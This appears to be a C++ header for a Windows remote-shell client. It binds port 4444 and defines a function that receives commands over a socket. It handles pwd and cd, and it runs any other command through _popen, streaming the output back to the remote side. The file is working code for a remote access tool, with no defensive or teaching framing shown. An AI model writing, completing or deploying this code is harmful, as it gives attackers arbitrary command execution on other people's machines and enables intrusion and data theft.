#pragma once
#ifndef CLIENT_H
#define CLIENT_H
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <windows.h>
#define PORT 4444                      // Global defintion of binding port for Client
#define BUFFER_SIZE 12900               // Global definition of buffer size for Client

// Get Working directory handling
std::string getCurrentDirectory() {
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    return std::string(buffer);
}
// Option one remote shell handling 
void executeCommand(SOCKET clientSocket, const std::string& command) {
    // Handle 'pwd' command
    if (command == "pwd") {
        std::string currentDir = getCurrentDirectory() + "\nEND";
        send(clientSocket, currentDir.c_str(), currentDir.size(), 0);
        return;
    }

    // Handle 'cd' command
    if (command.rfind("cd ", 0) == 0) {
        std::string path = command.substr(3); // Extract the path after 'cd '
        if (SetCurrentDirectoryA(path.c_str())) {
            std::string successMsg = "Changed directory to: " + getCurrentDirectory() + "\nEND";
            send(clientSocket, successMsg.c_str(), successMsg.size(), 0);
        }
        else {
            std::string errorMsg = "Error: Failed to change directory to " + path + "\nEND";
            send(clientSocket, errorMsg.c_str(), errorMsg.size(), 0);
        }
        return;
    }

    // Execute other commands (like dir, ipconfig)
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        std::string errorMsg = "Error: Failed to run command\nEND";
        send(clientSocket, errorMsg.c_str(), errorMsg.size(), 0);
        return;
    }

    char buffer[BUFFER_SIZE];
    std::string fullOutput;
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        send(clientSocket, buffer, strlen(buffer), 0); // Send each chunk immediately
    }
    _pclose(pipe);

    // Send end signal to mark completion
    const char* endSignal = "END";
    send(clientSocket, endSignal, strlen(endSignal), 0);
}

#endif //CLIENT_H